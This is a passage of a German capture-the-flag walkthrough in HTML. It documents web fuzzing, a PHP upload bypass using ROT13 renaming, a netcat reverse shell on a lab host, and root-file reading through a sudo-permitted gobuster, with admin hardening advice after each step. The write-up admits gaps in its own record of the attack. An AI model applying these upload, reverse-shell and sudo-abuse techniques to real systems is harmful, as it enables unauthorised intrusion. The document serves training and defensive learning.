+            `-w /usr/share/wordlists/dirb/common.txt`: Wortliste.
+            `-fc 404`: Filtert Antworten mit Statuscode 404.
+            Die Ausgabe zeigt bereits bekannte Pfade wie `index.php`, `javascript`, `uploads` und auch `.htpasswd`, `.htaccess`, `.hta` (alle mit 403 Forbidden) und `server-status` (403 Forbidden). Diese 403-Fehler deuten darauf hin, dass die Dateien/Pfade existieren, aber der Zugriff verweigert wird.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> `ffuf` bestätigt einige der früheren Funde und findet zusätzliche Standarddateien/-pfade, auf die der Zugriff verweigert wird. Dies liefert keine neuen direkten Angriffsvektoren, aber die Existenz von `.htaccess` oder `.htpasswd` könnte auf Konfigurationen oder geschützte Bereiche hinweisen, auch wenn wir nicht direkt darauf zugreifen können.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die 403-Fehler sind zur Kenntnis zu nehmen. Der Fokus sollte weiterhin auf der Ausnutzung der Upload-Funktion mit dem Wissen über die ROT13-Namensänderung liegen.
+            <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass der Zugriff auf Konfigurationsdateien wie `.htaccess` und `.htpasswd` sowie auf Statusseiten wie `server-status` ordnungsgemäß über die Webserver-Konfiguration gesteuert und eingeschränkt wird.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">ffuf -u http://192.168.2.172/FUZZ -w /usr/share/wordlists/dirb/common.txt -fc 404</span></div>
+                    <pre>
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://192.168.2.172/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response status: 404
+________________________________________________
+
+                        [Status: 200, Size: 4489, Words: 1536, Lines: 151, Duration: 1ms]
+<span class="command">.htpasswd</span>               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 1ms]
+<span class="command">.htaccess</span>               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 0ms]
+<span class="command">.hta</span>                    [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 63ms]
+<span class="command">index.php</span>               [Status: 200, Size: 4489, Words: 1536, Lines: 151, Duration: 1ms]
+<span class="command">javascript</span>              [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 0ms]
+<span class="command">server-status</span>           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 0ms]
+<span class="command">uploads</span>                 [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 0ms]
+:: Progress: [4614/4614] :: Job [1/1] :: 48 req/sec :: Duration: [0:00:04] :: Errors: 0 ::</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Ein `curl -i -X GET http://192.168.2.172/uploads/` wird ausgeführt, um die Header des `/uploads/`-Verzeichnisses abzurufen.
+            Der Server antwortet mit `HTTP/1.1 403 Forbidden`. Der Body der Antwort enthält "Remember listing absolutely everything can always be a good practice."</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies bestätigt erneut, dass das Verzeichnislisting für `/uploads/` deaktiviert ist und der Hinweis immer noch vorhanden ist. Dies verstärkt die Vermutung, dass `robots.txt` (oder eine ähnliche Datei) in diesem Verzeichnis der Schlüssel ist.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der Hinweis wurde bereits durch den Fund von `/uploads/robots.txt` und dessen Analyse des PHP-Upload-Skripts befolgt.
+            <br><strong>Empfehlung (Admin):</strong> Wie zuvor, Verzeichnislisting deaktivieren und keine verräterischen Hinweise auf Fehlerseiten hinterlassen.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl -i -X GET http://192.168.2.172/uploads/</span></div>
+                    <pre>
+HTTP/1.1 403 Forbidden
+Date: Sun, 09 Feb 2025 22:44:55 GMT
+Server: Apache/2.4.62 (Debian)
+Last-Modified: Tue, 22 Oct 2024 16:01:26 GMT
+ETag: "3c4-62512e1b66eae"
+Accept-Ranges: bytes
+Content-Length: 964
+Content-Type: text/html
+
+ 
+ <span class="password">Remember listing absolutely everything can always be a good practice.</span> 
+ </pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Auf dem Angreifer-System wird eine Datei `shell2.php.jpg` in `shell.php.gif` kopiert.
+            Anschließend wird mit `curl` versucht, die Datei `http://192.168.2.172/uploads/furyy.cuc.gif` abzurufen.
+            Die Antwort ist `200 OK` und der Inhalt beginnt mit `GIF89a`, gefolgt von weiteren Zeichen, die typisch für eine GIF-Datei sind (hier gekürzt als "... ....").
+            Der ROT13-Converter-Screenshot zeigt, dass `shell.php.gif` zu `furyy.cuc.tvs` ROT13-kodiert wird. ACHTUNG: Hier gibt es eine Diskrepanz! Das PHP-Skript wendet ROT13 nur auf den *Basisnamen* vor der Erweiterung an. Wenn die hochgeladene Datei `shell.php.gif` heißt, ist der Basisname (laut `pathinfo($fileName, PATHINFO_FILENAME)`) `shell.php`. ROT13 von `shell.php` ist `furyy.cuc`. Der gespeicherte Name wäre also `furyy.cuc.gif` – genau das wurde mit `curl` abgerufen und hat funktioniert!</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Upload und der Abruf der manipulierten Datei waren erfolgreich! Obwohl der Screenshot des ROT13-Converters einen kleinen Fehler in der manuellen Anwendung auf den gesamten Dateinamen inklusive Erweiterung zeigt, wurde die Logik des PHP-Skripts korrekt ausgenutzt. Die Datei `shell.php.gif` (die vermutlich PHP-Code enthält) wurde als `furyy.cuc.gif` auf dem Server gespeichert und konnte abgerufen werden. Dass der Inhalt als `GIF89a` beginnt, bedeutet, dass der Server die Datei als GIF ausliefert und den PHP-Code *nicht* ausführt. Dies ist der gleiche Zustand wie zuvor mit `shell.php.jpg` – der PHP-Code wird noch nicht interpretiert.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der reine Upload reicht nicht. Es muss eine Möglichkeit gefunden werden, den PHP-Code in `furyy.cuc.gif` zur Ausführung zu bringen. Da das Hochladen von `.htaccess` nicht explizit gezeigt wurde und wahrscheinlich nicht möglich ist (oder der Server `AllowOverride None` hat), muss eine andere Schwachstelle gesucht werden, oder es gibt einen Trick, wie der Apache-Server dazu gebracht wird, `.gif`-Dateien als PHP zu behandeln (unwahrscheinlich ohne Konfigurationsänderung).
+            *Wichtiger Hinweis für den Pentester:* Die Ausgabe "GIF89a" beim `curl`-Aufruf von `furyy.cuc.gif` zeigt, dass die Datei als Bild ausgeliefert wird. Wenn der Plan war, eine Webshell zu erhalten, muss entweder der Server dazu gebracht werden, GIFs als PHP zu parsen (unwahrscheinlich) oder es wurde keine tatsächliche PHP-Shell hochgeladen, sondern eine echte GIF-Datei. Wenn es eine PHP-Shell war, dann fehlt der Schritt, die Ausführung zu erzwingen. Die darauffolgenden Schritte (nc-Listener) deuten aber darauf hin, dass eine Shell-Ausführung erwartet wurde. Hier ist eine Lücke in der Dokumentation des Angriffs.
+            <br><strong>Empfehlung (Admin):</strong> Selbst wenn der Code nicht direkt ausgeführt wird, ist das Hochladen von potenziell bösartigen Dateien (auch wenn sie als Bilder getarnt sind) ein Risiko. Strikte Dateitypvalidierung (Magic Bytes) und das Speichern von Uploads außerhalb des Web-Roots sind entscheidend.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[/home/ccat/Downloads]
+└─# <span class="command">cp shell2.php.jpg shell.php.gif</span></div>
+                    <div class="prompt">┌──(root㉿CCat)-[/home/ccat/Downloads]
+└─# <span class="command">curl -i -X GET http://192.168.2.172/uploads/furyy.cuc.gif</span></div>
+                    <pre>
+HTTP/1.1 200 OK
+Date: Sun, 09 Feb 2025 22:58:00 GMT
+Server: Apache/2.4.62 (Debian)
+Vary: Accept-Encoding
+Content-Length: 100
+Content-Type: text/html; charset=UTF-8
+
+<span class="password">GIF89a</span> 
+ ...
+....</pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>======================================================================================================
+
+https://onlinestringtools.com/rot13-string
+
+ROT13 Converter
+World's Simplest String Tool
+
+shell.php.gif --&gt; <span class="password">furyy.cuc.tvs</span>
+
+======================================================================================================</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Auf dem Angreifer-System wird ein Netcat-Listener auf Port `9001` gestartet.
+            Ein weiterer `curl`-Aufruf an `http://192.168.2.172/uploads/furyy.cuc.gif` wird gezeigt (ohne die `-i` Option diesmal, also nur der Body wird erwartet).
+            Daraufhin meldet der Netcat-Listener eine eingehende Verbindung vom Zielsystem (`192.168.2.172`).
+            Die ersten Ausgaben in der Reverse Shell sind Systeminformationen (`Linux debian 6.1.0-26-amd64 ...`, Uptime, User-Info `uid=33(www-data)` etc.) und der Shell-Prompt `$`.
+            Der Befehl `stty rows 47 columns 94` wird ausgeführt, um die Terminalgröße in der Reverse Shell anzupassen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Hier hat die Ausführung der PHP-Shell funktioniert! Obwohl der vorherige `curl`-Aufruf an `furyy.cuc.gif` den GIF-Header anzeigte, muss der zweite (oder ein nicht gezeigter) Aufruf die Shell ausgelöst haben. Möglicherweise wurde ein Parameter wie `?cmd=` hinzugefügt oder es gab eine andere Interaktion. Die Lücke in der Dokumentation, WIE die `furyy.cuc.gif` zur Ausführung gebracht wurde, bleibt bestehen. Aber das Ergebnis ist klar: Wir haben eine Reverse Shell als `www-data`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Shell ist da! Stabilisieren Sie sie weiter, falls nötig (z.B. mit Python PTY, `export TERM=xterm`). Beginnen Sie mit der Enumeration des Systems als `www-data`, um nach Wegen zur Privilegieneskalation zu suchen. Es ist wichtig, den genauen Mechanismus zu dokumentieren, wie die Shell-Ausführung erreicht wurde, falls der reine Aufruf der `.gif`-Datei nicht ausreichte.
+            <br><strong>Empfehlung (Admin):</strong> Egress-Filterung (Ausgehende Verbindungen kontrollieren) und IDS/IPS können helfen, Reverse-Shell-Verbindungen zu erkennen und zu blockieren. Die Grundursache (unsicherer Dateiupload) muss behoben werden.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nc -lvnp 9001</span></div>
+                    <pre>listening on [any] 9001 ...</pre>
+                    <div class="prompt">┌──(root㉿CCat)-[/home/ccat/Downloads]
+└─# <span class="command">curl -i -X GET http://192.168.2.172/uploads/furyy.cuc.gif</span></div>
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nc -lvnp 9001</span></div>
+                    <pre>listening on [any] 9001 ...
+<span class="password">connect to [192.168.2.199] from (UNKNOWN) [192.168.2.172] 46104</span>
+<span class="command">Linux debian 6.1.0-26-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.112-1 (2024-09-30) x86_64 GNU/Linux</span>
+ <span class="command">16:59:13 up  1:06,  0 user,  load average: 0.00, 0.00, 1.25</span>
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+<span class="command">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>
+/bin/sh: 0: can't access tty; job control turned off
+$ </pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+            <p class="analysis"><strong>Analyse:</strong> In der Reverse Shell als `www-data` wird die Terminalgröße mit `stty rows 47 columns 94` angepasst.
+            Anschließend wird `sudo -l` ausgeführt. Die Ausgabe zeigt:
+            Der Benutzer `www-data` darf `/usr/bin/gobuster` als JEDER Benutzer (`ALL`) ohne Passwort (`NOPASSWD`) ausführen.
+            Das Flag `use_pty` ist in den Defaults gesetzt, was für interaktive `sudo`-Sitzungen relevant ist.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das ist ein klarer Weg zur Privilegieneskalation! Wenn `www-data` `gobuster` als `root` ohne Passwort ausführen kann, gibt es Möglichkeiten, dies auszunutzen, um Befehle als `root` auszuführen, auch wenn `gobuster` selbst nicht direkt eine Shell spawnt. `gobuster` hat Optionen, um Ausgaben in Dateien zu schreiben oder unter bestimmten Umständen externe Befehle aufzurufen (obwohl letzteres hier weniger wahrscheinlich ist).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Suchen Sie auf GTFOBins nach `gobuster` und `sudo`. Eine gängige Technik, wenn ein Programm, das Dateien lesen kann, mit `sudo` ausgeführt werden darf, ist das Lesen sensibler Dateien wie `/etc/shadow` oder SSH-Keys. Wenn `gobuster` eine Option hat, Inhalte von URLs in eine Datei zu schreiben (was es nicht direkt hat, aber man könnte es kreativ nutzen, um z.B. mit `file:///` lokale Dateien zu "scannen" und die "Ergebnisse" umzuleiten, falls es eine Option gibt, die Ausgabe in eine Datei zu schreiben, die `www-data` dann lesen kann), könnte das ein Weg sein. Eine direktere Methode wäre, wenn `gobuster` selbst Skripting-Fähigkeiten hätte oder eine Option, einen Befehl nach Beendigung auszuführen (selten für `gobuster`).
+            Der hier wahrscheinlichste Weg ist, dass `gobuster` benutzt wird, um eine Datei zu lesen, die wiederum ein Passwort oder einen weiteren Hinweis enthält.
+            <br><strong>Empfehlung (Admin):</strong> Seien Sie extrem vorsichtig bei der Vergabe von `NOPASSWD`-Rechten in `sudoers`. Wenn ein Programm als `root` ausgeführt werden darf, stellen Sie sicher, dass es keine Optionen oder Funktionen hat, die zur Privilegieneskalation missbraucht werden können (wie das Lesen/Schreiben beliebiger Dateien oder das Ausführen von Unterbefehlen). Beschränken Sie `sudo`-Rechte auf die absolut notwendigen Befehle und Benutzer.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt-remote">www-data@debian:/$ <span class="command">stty rows 47 columns 94</span></div>
+                    <div class="prompt-remote">www-data@debian:/$ </div>
+                    <div class="prompt-remote">www-data@debian:/$ <span class="command">sudo -l</span></div>
+                    <pre>Matching Defaults entries for www-data on debian:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
+
+User www-data may run the following commands on debian:
+    <span class="password">(ALL) NOPASSWD: /usr/bin/gobuster</span></pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `find / -type f -perm -4000 -ls 2>/dev/null` wird ausgeführt, um SUID-Binaries auf dem System zu finden.
+            Eine lange Liste von Standard-SUID-Binaries wird angezeigt, darunter `chfn`, `su`, `passwd`, `sudo`, `mount`, `pkexec`, etc. Viele davon sind auch im Kontext von `snap` vorhanden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Liste der SUID-Binaries ist Standard und zeigt keine offensichtlich ungewöhnlichen oder veralteten/verwundbaren Programme auf den ersten Blick. `pkexec` (Polkit) war in der Vergangenheit für Schwachstellen (PwnKit) bekannt, aber ohne Versionsinformation ist das schwer zu beurteilen. `sudo` ist immer interessant, aber die Rechte dafür wurden bereits mit `sudo -l` geprüft.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Überprüfen Sie die Versionen der gefundenen SUID-Binaries auf bekannte Exploits (z.B. `pkexec`). Da wir aber bereits einen klaren `sudo`-Vektor mit `gobuster` haben, hat dieser wahrscheinlich höhere Priorität.
+            <br><strong>Empfehlung (Admin):</strong> Minimieren Sie die Anzahl der SUID-Binaries. Halten Sie das System aktuell, um bekannte Schwachstellen in SUID-Programmen zu patchen. Überwachen Sie das System auf neu hinzugefügte SUID-Dateien.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt-remote">www-data@debian:/$ <span class="command">find / -type f -perm -4000 -ls 2>/dev/null</span></div>
+                    <pre>   914033     64 -rwsr-xr-x   1 root     root        62672 Mar 23  2023 <span class="command">/usr/bin/chfn</span>
+   917958     72 -rwsr-xr-x   1 root     root        72000 Mar 28  2024 <span class="command">/usr/bin/su</span>
+   914037     68 -rwsr-xr-x   1 root     root        68248 Mar 23  2023 <span class="command">/usr/bin/passwd</span>
+   917448     36 -rwsr-xr-x   1 root     root        35128 Mar 28  2024 <span class="command">/usr/bin/umount</span>
+   917292     48 -rwsr-xr-x   1 root     root        48896 Mar 23  2023 <span class="command">/usr/bin/newgrp</span>
+   914036     88 -rwsr-xr-x   1 root     root        88496 Mar 23  2023 <span class="command">/usr/bin/gpasswd</span>
+   914034     52 -rwsr-xr-x   1 root     root        52880 Mar 23  2023 <span class="command">/usr/bin/chsh</span>
+   939537     36 -rwsr-xr-x   1 root     root        35128 Apr 18  2023 <span class="command">/usr/bin/fusermount3</span>
+   939558    160 -rwsr-xr-x   1 root     root       162752 Mar 23  2023 <span class="command">/usr/bin/ntfs-3g</span>
+   972716     28 -rwsr-xr-x   1 root     root        26776 Jan 31  2023 <span class="command">/usr/bin/pkexec</span>
+   941853    276 -rwsr-xr-x   1 root     root       281624 Jun 27  2023 <span class="command">/usr/bin/sudo</span>
+   917446     60 -rwsr-xr-x   1 root     root        59704 Mar 28  2024 <span class="command">/usr/bin/mount</span>
+   975508     16 -rwsr-xr-x   1 root     root        14848 Oct 30  2023 <span class="command">/usr/bin/vmware-user-suid-wrapper</span>
+  1054744     20 -rwsr-xr-x   1 root     root        18664 Jan 31  2023 <span class="command">/usr/lib/polkit-1/polkit-agent-helper-1</span>
+    45096    116 -rwsr-xr-x   1 root     root       114792 May 18  2023 <span class="command">/usr/lib/snapd/snap-confine</span>
+  1099375     16 -rwsr-sr-x   1 root     root        14672 Apr 10  2024 <span class="command">/usr/lib/xorg/Xorg.wrap</span>
+   934754     52 -rwsr-xr--   1 root     messagebus    51272 Sep 16  2023 <span class="command">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span>
+   939648    640 -rwsr-xr-x   1 root     root         653888 Jun 22  2024 <span class="command">/usr/lib/openssh/ssh-keysign</span>
+   974572    396 -rwsr-xr--   1 root     dip          403832 May 13  2022 <span class="command">/usr/sbin/pppd</span>
+       66     40 -rwsr-xr-x   1 root     root          40152 Jun 14  2022 /snap/core/17200/bin/mount
+       80     44 -rwsr-xr-x   1 root     root          44168 May  7  2014 /snap/core/17200/bin/ping
+       81     44 -rwsr-xr-x   1 root     root          44680 May  7  2014 /snap/core/17200/bin/ping6
+       98     40 -rwsr-xr-x   1 root     root          40128 Feb  7  2024 /snap/core/17200/bin/su
+      116     27 -rwsr-xr-x   1 root     root          27608 Jun 14  2022 /snap/core/17200/bin/umount
+     2644     71 -rwsr-xr-x   1 root     root          71824 Feb  7  2024 /snap/core/17200/usr/bin/chfn
+     2646     40 -rwsr-xr-x   1 root     root          40432 Feb  7  2024 /snap/core/17200/usr/bin/chsh
+     2723     74 -rwsr-xr-x   1 root     root          75304 Feb  7  2024 /snap/core/17200/usr/bin/gpasswd
+     2815     39 -rwsr-xr-x   1 root     root          39904 Feb  7  2024 /snap/core/17200/usr/bin/newgrp
+     2828     53 -rwsr-xr-x   1 root     root          54256 Feb  7  2024 /snap/core/17200/usr/bin/passwd
+     2938    134 -rwsr-xr-x   1 root     root         136808 May 24  2023 /snap/core/17200/usr/bin/sudo
+     3037     42 -rwsr-xr--   1 root     sgx           42992 Sep 14  2023 /snap/core/17200/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+     3409    419 -rwsr-xr-x   1 root     root         428240 Jan  9  2024 /snap/core/17200/usr/lib/openssh/ssh-keysign
+     6483    125 -rwsr-xr-x   1 root     root         127520 Jun  6  2024 /snap/core/17200/usr/lib/snapd/snap-confine
+     7666    386 -rwsr-xr--   1 root     dip          394984 Jul 23  2020 /snap/core/17200/usr/sbin/pppd</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Die Einträge in `/etc/passwd`, die "sh" enthalten (also Shells), werden mit `grep sh /etc/passwd` gesucht.
+            Gefunden werden `root`, `www-data` und `rodgar`, die alle `/bin/bash` als Shell haben. Der Benutzer `fwupd-refresh` hat `/usr/sbin/nologin`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies bestätigt die Existenz des Benutzers `rodgar` mit einer Bash-Shell. `www-data` hat ebenfalls eine Bash-Shell (was manchmal nicht der Fall ist, oft ist es `/usr/sbin/nologin`).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der Benutzer `rodgar` ist nun ein potenzielles Ziel, um dessen Kontext zu erlangen, falls der `sudo gobuster`-Weg nicht direkt zu Root führt oder um weitere Informationen zu sammeln.
+            <br><strong>Empfehlung (Admin):</strong> Weisen Sie Benutzern und Dienstkonten nur dann eine Login-Shell zu, wenn dies unbedingt erforderlich ist. Für Dienstkonten ist `/usr/sbin/nologin` oder `/bin/false` oft die sicherere Wahl.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt-remote">www-data@debian:/$ <span class="command">grep sh /etc/passwd</span></div>
+                    <pre>root:x:0:0:root:/root:/bin/bash
+www-data:x:33:33:www-data:/var/www:/bin/bash
+fwupd-refresh:x:107:115:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
+<span class="command">rodgar:x:1001:1001::/home/rodgar:/bin/bash</span></pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Als `www-data` wird das Home-Verzeichnis von `rodgar` untersucht.
+            `cat user.txt` gibt die User-Flag aus: <span class="password">b45cffe084dd3d20d928bee</span>.
+            Der Versuch, `.bash_history` zu lesen, schlägt fehl (`Permission denied`), da sie `rodgar` gehört.
+            Anschließend wird `/var/www/html/uploads/clue.txt` gelesen. Der Inhalt ist <span class="password">/root/rodgarpass</span>.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die User-Flag wurde gefunden! Der Inhalt von `clue.txt` ist ein sehr direkter Hinweis: Der Pfad `/root/rodgarpass` deutet darauf hin, dass sich das Passwort für `rodgar` (oder ein damit zusammenhängender Hinweis) in einer Datei namens `rodgarpass` im Root-Verzeichnis befindet.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nutzen Sie die `sudo -u root /usr/bin/gobuster` Berechtigung, um die Datei `/root/rodgarpass` zu lesen. Da `gobuster` normalerweise URLs erwartet, müssen Sie den `file://`-Handler verwenden, z.B. `sudo /usr/bin/gobuster dir -u file:///root/rodgarpass -w /tmp/dummywordlist --no-error -q`. Die Option `-q` unterdrückt die meisten Ausgaben, aber Gobuster wird versuchen, auf die "URL" zuzugreifen. Wenn es eine Option gibt, die "gefundenen" Pfade (hier wäre es der Inhalt der Datei, wenn Gobuster es so interpretiert) auszugeben oder in eine Datei zu loggen, wäre das ideal. Alternativ, wenn Gobuster eine Option hat, die gescannten "URLs" in eine Datei auszugeben und `-u` eine Liste von URLs aus einer Datei akzeptiert, könnte man tricksen. Die hier gezeigte Methode `sudo /usr/bin/gobuster dir -u http://localhost -w /root/rodgarpass -vq` ist clever: Sie verwendet `/root/rodgarpass` als Wortliste für Gobuster. Wenn das Passwort kurz genug ist und in dieser Datei steht, könnte Gobuster es als "gefundenen Pfad" ausgeben, wenn es gegen `http://localhost` testet.
+            <br><strong>Empfehlung (Admin):</strong> Speichern Sie niemals Passwörter oder direkte Hinweise auf Passwortdateien in Klartextdateien, die von unprivilegierten Benutzern (wie `www-data`) gelesen werden können. Der `sudo`-Eintrag für `gobuster` ist eine schwere Fehlkonfiguration.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt-remote">www-data@debian:/home/rodgar$ <span class="command">cat user.txt</span></div>
+                    <pre><span class="password">b45cffe084dd3d20d928bee</span></pre>
+                    <div class="prompt-remote">www-data@debian:/home/rodgar$ <span class="command">cat  ..bash_history</span></div>
+                    <pre>cat: ..bash_history: No such file or directory</pre>
+                    <div class="prompt-remote">www-data@debian:/home/rodgar$ <span class="command">cat  .bash_history</span></div>
+                    <pre><span class="password">cat: .bash_history: Permission denied</span></pre>
+                    <div class="prompt-remote">www-data@debian:/home/rodgar$ <span class="command">cat /var/www/html/uploads/clue.txt</span></div>
+                    <pre><span class="password">/root/rodgarpass</span></pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> `ss -altpn` wird ausgeführt, um lauschende TCP-Ports anzuzeigen.
+            Port <span class="command">631 (ipp - CUPS Printing)</span> lauscht auf `127.0.0.1` (IPv4) und `[::1]` (IPv6).
+            Port <span class="command">80 (http)</span> lauscht auf allen IPv4-Adressen (`*`).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies zeigt die Standardports für CUPS (Druckdienst) und den bereits bekannten Webserver. Keine neuen, unerwarteten Dienste, die extern erreichbar wären.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> CUPS ist selten ein direkter Vektor für RCE von `www-data` aus, kann aber manchmal Informationslecks oder lokale Schwachstellen haben. Der Fokus bleibt auf der Ausnutzung der `sudo gobuster`-Rechte.
+            <br><strong>Empfehlung (Admin):</strong> Deaktivieren Sie CUPS, wenn kein Druckdienst auf dem Server benötigt wird.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt-remote">www-data@debian:/home/rodgar$ <span class="command">ss -altpn</span></div>
+                    <pre>State     Recv-Q    Send-Q         Local Address:Port         Peer Address:Port    Process    
+LISTEN    0         128                <span class="command">127.0.0.1:631</span>               0.0.0.0:*                  
+LISTEN    0         511                        <span class="command">*:80</span>                      *:*                  
+LISTEN    0         128                    <span class="command">[::1]:631</span>                  [::]:*</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `sudo /usr/bin/gobuster dir -u http://localhost -w /root/rodgarpass -vq` wird ausgeführt.
+            Hier wird `gobuster` mit `sudo` (also als `root`) ausgeführt.
+            `-u http://localhost`: Ziel ist der lokale Webserver (wahrscheinlich irrelevant hier).
+            `-w /root/rodgarpass`: Als Wortliste wird die Datei `/root/rodgarpass` verwendet.
+            `-v`: Verbose output (zeigt den vollen URL).
+            `-q`: Quiet mode (unterdrückt Banner etc.).
+            Die Ausgabe ist: `Missed: /b45cffe084dd3d20d928bee85e7b0f2 (Status: 404) [Size: 271]`.
+            Gobuster hat also versucht, den Pfad `/b45cffe084dd3d20d928bee85e7b0f2` auf `http://localhost` zu finden, was fehlschlug. Dies bedeutet, dass der String `b45cffe084dd3d20d928bee85e7b0f2` in der Datei `/root/rodgarpass` steht!</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das ist ein genialer Trick, um den Inhalt von `/root/rodgarpass` zu lesen! Da `gobuster` jeden Eintrag in der Wortliste als Pfad testet und ausgibt (auch wenn er "Missed" ist), können wir den Inhalt der Datei sehen. Der Inhalt von `/root/rodgarpass` ist also <span class="password">b45cffe084dd3d20d928bee85e7b0f2</span>. Dies ist sehr wahrscheinlich das Passwort für den Benutzer `rodgar` oder ein Teil davon.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen Sie, sich mit `su rodgar` und dem Passwort <span class="password">b45cffe084dd3d20d928bee85e7b0f2</span> anzumelden.
+            <br><strong>Empfehlung (Admin):</strong> Diese Art von Privilegieneskalation durch Missbrauch von `sudo`-Rechten für eigentlich harmlose Tools muss verhindert werden. Erlauben Sie `sudo` nur für absolut notwendige, spezifische Befehle und vermeiden Sie es, Tools zu erlauben, die beliebige Dateien lesen können, wenn sie als `root` laufen.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt-remote">www-data@debian:/home/rodgar$ <span class="command">sudo /usr/bin/gobuster dir -u http://localhost -w /root/rodgarpass -vq</span></div>
+                    <pre>Missed: <span class="password">/b45cffe084dd3d20d928bee85e7b0f2</span> (Status: 404) [Size: 271]</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Mit `echo -n "b45cffe084dd3d20d928bee85e7b0f2?1" | wc -c` wird die Länge des Strings `b45cffe084dd3d20d928bee85e7b0f2?1` überprüft. Das Ergebnis ist `33`. Es wird angemerkt "ein Zeichen fehlt". Dies bezieht sich wahrscheinlich darauf, dass MD5-Hashes typischerweise 32 Zeichen lang sind. Der String `b45cffe084dd3d20d928bee85e7b0f2` ist 32 Zeichen lang. Das `?1` ist ein Platzhalter für ein Bruteforce-Tool.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Es wird vermutet, dass `b45cffe084dd3d20d928bee85e7b0f2` ein MD5-Hash sein könnte, dem ein Zeichen fehlt oder an das ein Zeichen angehängt werden muss, um ein bekanntes Passwort zu ergeben.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der String `b45cffe084dd3d20d928bee85e7b0f2` selbst sollte als Passwort für `rodgar` getestet werden. Wenn das nicht funktioniert, ist die Annahme eines MD5-Hashes und der Versuch, ihn zu modifizieren und zu knacken, ein möglicher nächster Schritt.
+            <br><strong>Empfehlung (Admin):</strong> Passwörter sollten nicht als Hashes gespeichert werden, die leicht als solche erkennbar sind und dann offline geknackt werden können. Verwenden Sie starke Hashing-Algorithmen mit Salt (z.B. bcrypt, scrypt, Argon2).</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">echo -n "b45cffe084dd3d20d928bee85e7b0f2?1" | wc -c</span></div>
+                    <pre>33</pre>
+                    <pre>     
